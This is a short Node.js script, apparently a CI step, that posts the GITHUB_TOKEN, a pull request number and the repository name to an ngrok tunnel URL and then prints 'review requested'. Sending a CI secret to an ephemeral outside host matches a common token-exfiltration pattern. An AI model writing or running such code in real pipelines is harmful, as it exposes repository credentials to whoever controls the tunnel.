import { got } from 'got';

(async () => {
  got.post('https://secretly-fancy-starfish.ngrok-free.app/review', {
    json: {
      githubToken: process.env.GITHUB_TOKEN,
      pullRequestNumber: Number(process.env.PR_NUMBER),
      repository: process.env.REPO,
    },
  });
})();

console.log('review requested');
